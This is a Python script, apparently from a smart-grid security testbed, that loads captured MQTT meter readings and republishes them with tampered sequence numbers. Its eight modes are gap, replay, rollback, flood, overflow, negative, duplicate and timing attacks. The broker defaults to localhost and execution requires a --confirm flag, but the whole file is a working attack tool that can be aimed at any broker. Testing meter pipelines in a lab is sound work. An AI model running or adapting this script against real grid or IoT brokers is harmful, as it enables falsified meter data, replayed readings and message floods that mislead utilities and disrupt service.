#!/usr/bin/env python3
"""
Sequence Manipulation Attacker - Exploits sequence number validation weaknesses
"""

import os
import json
import time
import argparse
import random
import threading
from typing import List, Dict, Any
import paho.mqtt.client as mqtt

# Config
DEFAULT_BROKER = "localhost"
DEFAULT_PORT = 1883
DEFAULT_TOPIC = "grid/readings"
CAPTURE_FILE = os.path.abspath(os.path.join(os.path.dirname(__file__), "..", "data", "captures.json"))

class SequenceManipulationAttacker:
    def __init__(self, broker=DEFAULT_BROKER, port=DEFAULT_PORT, topic=DEFAULT_TOPIC):
        self.broker = broker
        self.port = port
        self.topic = topic
        self.captures = self.load_captures()
        self.sequence_tracker = {}  # Track sequences per meter
        
    def load_captures(self) -> List[Dict[str, Any]]:
        if not os.path.exists(CAPTURE_FILE):
            return []
        with open(CAPTURE_FILE, "r") as f:
            return json.load(f)
    
    def get_meter_sequences(self, meter_id: str) -> List[int]:
        """Get all sequence numbers for a specific meter"""
        sequences = []
        for capture in self.captures:
            if capture["payload"].get("meterID") == meter_id:
                sequences.append(capture["payload"].get("seq", 0))
        return sorted(sequences)
    
    def sequence_gap_attack(self, payload: dict, gap_size: int = 10):
        """Create large gaps in sequence numbers"""
        meter_id = payload.get("meterID")
        if meter_id not in self.sequence_tracker:
            self.sequence_tracker[meter_id] = 0
        
        # Create a large gap
        self.sequence_tracker[meter_id] += gap_size
        payload["seq"] = self.sequence_tracker[meter_id]
        
        return payload
    
    def sequence_replay_attack(self, payload: dict, replay_count: int = 3):
        """Replay the same sequence number multiple times"""
        original_seq = payload.get("seq", 0)
        
        for i in range(replay_count):
            modified_payload = payload.copy()
            modified_payload["seq"] = original_seq
            modified_payload["ts"] = int(time.time()) + i
            self.publish_attack(modified_payload)
            time.sleep(0.5)
    
    def sequence_rollback_attack(self, payload: dict):
        """Rollback to previous sequence numbers"""
        meter_id = payload.get("meterID")
        sequences = self.get_meter_sequences(meter_id)
        
        if len(sequences) > 1:
            # Rollback to previous sequence
            payload["seq"] = sequences[-2]
        else:
            # Rollback to 0
            payload["seq"] = 0
        
        return payload
    
    def sequence_flood_attack(self, payload: dict, flood_count: int = 10):
        """Flood with rapid sequence numbers"""
        meter_id = payload.get("meterID")
        if meter_id not in self.sequence_tracker:
            self.sequence_tracker[meter_id] = 0
        
        for i in range(flood_count):
            modified_payload = payload.copy()
            self.sequence_tracker[meter_id] += 1
            modified_payload["seq"] = self.sequence_tracker[meter_id]
            modified_payload["ts"] = int(time.time()) + i
            self.publish_attack(modified_payload)
            time.sleep(0.1)
    
    def sequence_overflow_attack(self, payload: dict):
        """Test sequence number overflow scenarios"""
        overflow_values = [
            2**31 - 1,  # Max 32-bit signed int
            2**32 - 1,  # Max 32-bit unsigned int
            2**63 - 1,  # Max 64-bit signed int
            0xFFFFFFFF,  # Max 32-bit hex
        ]
        
        payload["seq"] = random.choice(overflow_values)
        return payload
    
    def sequence_negative_attack(self, payload: dict):
        """Test negative sequence numbers"""
        negative_values = [-1, -10, -100, -1000]
        payload["seq"] = random.choice(negative_values)
        return payload
    
    def sequence_duplicate_attack(self, payload: dict):
        """Create duplicate sequence numbers with different timestamps"""
        original_seq = payload.get("seq", 0)
        
        # Send same sequence with different timestamps
        for i in range(3):
            modified_payload = payload.copy()
            modified_payload["seq"] = original_seq
            modified_payload["ts"] = int(time.time()) + i * 60  # Different timestamps
            self.publish_attack(modified_payload)
            time.sleep(0.2)
    
    def sequence_timing_attack(self, payload: dict):
        """Manipulate timing between sequence numbers"""
        meter_id = payload.get("meterID")
        if meter_id not in self.sequence_tracker:
            self.sequence_tracker[meter_id] = 0
        
        # Send sequences with irregular timing
        timing_patterns = [0.1, 0.5, 1.0, 2.0, 0.1, 0.1]  # Irregular pattern
        
        for delay in timing_patterns:
            modified_payload = payload.copy()
            self.sequence_tracker[meter_id] += 1
            modified_payload["seq"] = self.sequence_tracker[meter_id]
            modified_payload["ts"] = int(time.time())
            self.publish_attack(modified_payload)
            time.sleep(delay)
    
    def publish_attack(self, payload: dict, target_topic: str = None):
        """Publish the attack payload"""
        client = mqtt.Client(client_id=f"seq_manip_{int(time.time()*1000)}")
        client.connect(self.broker, self.port, 60)
        client.loop_start()
        
        topic = target_topic or self.topic
        payload_str = json.dumps(payload, separators=(",", ":"), sort_keys=False)
        client.publish(topic, payload_str)
        
        time.sleep(0.2)
        client.loop_stop()
        client.disconnect()
        
        print(f"[SEQ_MANIP] Published: meter={payload.get('meterID')} seq={payload.get('seq')} ts={payload.get('ts')}")
    
    def run_sequence_attacks(self, attack_type: str = "all", target_meter: str = None):
        """Run various sequence manipulation attacks"""
        if not self.captures:
            print("No captures available for sequence attacks")
            return
        
        # Filter captures by meter if specified
        target_captures = self.captures
        if target_meter:
            target_captures = [c for c in self.captures if c["payload"].get("meterID") == target_meter]
        
        if not target_captures:
            print(f"No captures found for meter {target_meter}")
            return
        
        target_capture = random.choice(target_captures)
        original_payload = target_capture["payload"].copy()
        
        attacks = {
            "gap": lambda p: self.sequence_gap_attack(p, 10),
            "replay": lambda p: self.sequence_replay_attack(p, 3),
            "rollback": self.sequence_rollback_attack,
            "flood": lambda p: self.sequence_flood_attack(p, 10),
            "overflow": self.sequence_overflow_attack,
            "negative": self.sequence_negative_attack,
            "duplicate": self.sequence_duplicate_attack,
            "timing": self.sequence_timing_attack,
        }
        
        if attack_type == "all":
            for attack_name, attack_func in attacks.items():
                print(f"[SEQ_MANIP] Running {attack_name} attack...")
                if attack_name in ["replay", "flood", "duplicate", "timing"]:
                    attack_func(original_payload.copy())
                else:
                    modified_payload = attack_func(original_payload.copy())
                    self.publish_attack(modified_payload)
                time.sleep(2)
        elif attack_type in attacks:
            print(f"[SEQ_MANIP] Running {attack_type} attack...")
            if attack_type in ["replay", "flood", "duplicate", "timing"]:
                attacks[attack_type](original_payload.copy())
            else:
                modified_payload = attacks[attack_type](original_payload.copy())
                self.publish_attack(modified_payload)

def main():
    parser = argparse.ArgumentParser(description="Sequence Manipulation Attacker")
    parser.add_argument("--broker", default=DEFAULT_BROKER)
    parser.add_argument("--port", type=int, default=DEFAULT_PORT)
    parser.add_argument("--topic", default=DEFAULT_TOPIC)
    parser.add_argument("--attack", choices=["gap", "replay", "rollback", "flood", "overflow", 
                                            "negative", "duplicate", "timing", "all"], 
                       default="all", help="Type of sequence manipulation attack")
    parser.add_argument("--target-meter", help="Target meter ID for attacks")
    parser.add_argument("--confirm", action="store_true", help="Required to execute attacks")
    
    args = parser.parse_args()
    
    if not args.confirm:
        print("Sequence manipulation attacks require --confirm")
        return
    
    attacker = SequenceManipulationAttacker(args.broker, args.port, args.topic)
    attacker.run_sequence_attacks(args.attack, args.target_meter)

if __name__ == "__main__":
    main()